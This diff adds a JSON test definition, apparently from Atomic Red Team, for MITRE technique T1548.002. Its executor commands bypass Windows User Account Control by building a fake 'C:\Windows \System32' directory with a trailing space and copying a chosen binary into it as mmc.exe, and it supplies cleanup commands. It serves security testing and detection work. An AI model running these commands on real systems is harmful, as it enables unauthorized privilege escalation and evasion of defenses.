@@ -1,0 +1,32 @@
+{
+    "name": "Bypass UAC by Mocking Trusted Directories",
+    "description": "Creates a fake trusted directory and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n",
+        "cleanup_command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul\ndel \"c:\\testbypass.exe\" >nul 2>nul\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1548.002",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Bypass User Account Control",
+    "source": "ART",
+    "uuid": "f7a35090-6f7f-4f64-bb47-d657bf5b10c1",
+    "arguments": {
+        "executable_binary": {
+            "description": "Binary to execute with UAC Bypass",
+            "type": "path",
+            "default": "C:\\Windows\\System32\\cmd.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
